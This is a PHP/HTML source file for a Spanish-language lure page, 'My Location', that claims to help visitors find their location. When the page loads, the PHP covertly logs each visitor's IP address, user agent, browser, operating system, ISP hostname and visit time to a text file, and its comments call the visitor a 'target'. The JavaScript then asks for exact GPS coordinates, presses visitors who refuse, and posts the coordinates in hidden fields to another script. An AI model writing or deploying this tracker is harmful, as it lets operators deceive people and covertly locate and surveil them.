<?php


  function getUserIP()
  {
    // Get real visitor IP
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"]))
    {
      $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
      $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
  }


$ip = getUserIP();
$agent = $_SERVER['HTTP_USER_AGENT'];
$server_port=$_SERVER['SERVER_PORT'];
$gateway=$_SERVER['GATEWAY_INTERFACE'];
$pagina = $_SERVER['REQUEST_URI'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);


#CAPTURA EL NAVEGADOR
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$user_agent;
  function getBrowser($user_agent){
    if(strpos($user_agent, 'Maxthon') !== FALSE)
      return "Maxthon";
    elseif(strpos($user_agent, 'SeaMonkey') !== FALSE)
      return "SeaMonkey";
    elseif(strpos($user_agent, 'Vivaldi') !== FALSE)
      return "Vivaldi";
    elseif(strpos($user_agent, 'Arora') !== FALSE)
      return "Arora";
    elseif(strpos($user_agent, 'Avant Browser') !== FALSE)
      return "Avant Browser";
    elseif(strpos($user_agent, 'Beamrise') !== FALSE)
      return "Beamrise";
    elseif(strpos($user_agent, 'Epiphany') !== FALSE)
      return 'Epiphany';
    elseif(strpos($user_agent, 'Chromium') !== FALSE)
      return 'Chromium';
    elseif(strpos($user_agent, 'Iceweasel') !== FALSE)
      return 'Iceweasel';
    elseif(strpos($user_agent, 'Galeon') !== FALSE)
      return 'Galeon';
    elseif(strpos($user_agent, 'Edge') !== FALSE)
      return 'Microsoft Edge';
    elseif(strpos($user_agent, 'Trident') !== FALSE) //IE 11
      return 'Internet Explorer';
    elseif(strpos($user_agent, 'MSIE') !== FALSE)
      return 'Internet Explorer';
    elseif(strpos($user_agent, 'Opera Mini') !== FALSE)
      return "Opera Mini";
    elseif(strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR') !== FALSE)
      return "Opera";
    elseif(strpos($user_agent, 'Firefox') !== FALSE)
      return 'Mozilla Firefox';
    elseif(strpos($user_agent, 'Chrome') !== FALSE)
      return 'Google Chrome';
    elseif(strpos($user_agent, 'Safari') !== FALSE)
      return "Safari";
    elseif(strpos($user_agent, 'iTunes') !== FALSE)
      return 'iTunes';
    elseif(strpos($user_agent, 'Konqueror') !== FALSE)
      return 'Konqueror';
    elseif(strpos($user_agent, 'Dillo') !== FALSE)
      return 'Dillo';
    elseif(strpos($user_agent, 'Netscape') !== FALSE)
      return 'Netscape';
    elseif(strpos($user_agent, 'Midori') !== FALSE)
      return 'Midori';
    elseif(strpos($user_agent, 'ELinks') !== FALSE)
      return 'ELinks';
    elseif(strpos($user_agent, 'Links') !== FALSE)
      return 'Links';
    elseif(strpos($user_agent, 'Lynx') !== FALSE)
      return 'Lynx';
    elseif(strpos($user_agent, 'w3m') !== FALSE)
      return 'w3m';
    else
      return 'No hemos podido detectar su navegador';
  }
  $ua = getBrowser($user_agent);
  
  
  
  #CAPTURA EL SISTEMA OPERATIVO
  $user_agent = $_SERVER['HTTP_USER_AGENT'];
function getPlatform($user_agent) {
   $plataformas = array(
      'Windows 10' => 'Windows NT 10.0+',
      'Windows 8.1' => 'Windows NT 6.3+',
      'Windows 8' => 'Windows NT 6.2+',
      'Windows 7' => 'Windows NT 6.1+',
      'Windows Vista' => 'Windows NT 6.0+',
      'Windows XP' => 'Windows NT 5.1+',
      'Windows 2003' => 'Windows NT 5.2+',
      'Windows' => 'Windows otros',
      'iPhone' => 'iPhone',
      'iPad' => 'iPad',
      'Mac OS X' => '(Mac OS X+)|(CFNetwork+)',
      'Mac otros' => 'Macintosh',
      'Android' => 'Android',
      'BlackBerry' => 'BlackBerry',
      'Linux' => 'Linux',
   );
   foreach($plataformas as $plataforma=>$pattern){
      if (preg_match("/$pattern/", $user_agent))
         return $plataforma;
   }
   return 'Otras';
}
$SO = getPlatform($user_agent);

@$fecha = date("d/m/Y",time()); /*capturamos fecha y hora a la cual ingreso (configurar pais)*/
$date = new DateTime($fecha, new DateTimeZone('America/Mexico_City'));
date_default_timezone_set('America/Mexico_City');
$zonahoraria = date_default_timezone_get();
@$fecha=date("d/m/Y",time());

@$hora_actual = date ("g:i:s A",time());
$date = new DateTime($fecha, new DateTimeZone('America/Mexico_City'));
date_default_timezone_set('America/Mexico_City');
$zonahoraria = date_default_timezone_get();
@$hora_actual=date("g:i:s A",time());

$datum = date("d-m-y / H:i:s",time());
$invoegen = $datum . "<br><hr>";


$f = fopen("info.txt", "a"); /*crea un archivo txt donde se guarda las cuentas*/
fwrite ($f, 
'<Info:
 Objetivo ingreso:'.$invoegen.'
 id:'.$f.'
 Navegador:'.$ua.'
 User-Agent:'.$agent.'
 ISP:'.$hostname.'
 Sistema:'.$SO.'
 IP:'.$ip.'
 Fecha:'.$fecha.'
 Hora:'.$hora_actual.'
 Puerto:'.$server_port.'
 Gateway:'.$gateway.'
 

 ');


fclose($f);


?>


<!DOCTYPE html>

<html>
    <head>
        <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
        <title>My Location</title>
        <link rel="stylesheet" href="styles/style.css">
        <link rel="stylesheet" href="styles/fonts.css">
        <meta property="og:title" content="My Location">
							<meta property="og:description" content="Encuentre su ubicación exacta fácilmente...">
							<meta property="og:image" content="https://i.ibb.co/q1Mp26h/1602462651006.jpg">
							<meta property="og:site_name" content="My Location">
        <meta property="og:url" content="www.mylocation.com">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    </head>
<body style="background-color: #111">
<div>
<img src="https://i.ibb.co/CKwB13V/1602297066820.png" alt="dragon" width="45%" height="auto">
<h1 class="font-effect-neon" style="display: inline-block;position: absolute;top: 35px;font-size:35px;float:center;">My Location</h1>
</div>
<div id='ubicacion'></div>

<script type="text/javascript">
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(mostrarUbicacion, showError);
     } else {alert("¡Error! Este navegador no soporta la Geolocalización.");}

function mostrarUbicacion(position) {
    var latitud = position.coords.latitude;
    var longitud = position.coords.longitude;
    var div = document.getElementById("ubicacion");
    div.innerHTML = "<p style='text-align:center;font-size:30px;'><code>Bienvenido<code></p>" +
    "<form name = 'formulario_porcentaje' method='post' action='result.php'><br><input type='hidden' name='latitud' value='"+latitud+"'><br><input type='hidden' name='longitud' value="+longitud+"><center><button class='raise' style='width: 80%;height: auto;font-size:20px;'>Start</button></center></form>";}

function showError(error)
{
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			var denied = 'User denied the request for Geolocation';
      alert('Por favor activa tu ubicación, recargame y pulsa en Permitir...');
      break;
		case error.POSITION_UNAVAILABLE:
			var unavailable = 'Location information is unavailable';
			break;
		case error.TIMEOUT:
			var timeout = 'The request to get user location timed out';
      alert('Por favor configure el modo de ubicación en alta precisión...');
			break;
		case error.UNKNOWN_ERROR:
			var unknown = 'An unknown error occurred';
			break;
	}}

</script>    
</body>
</html>
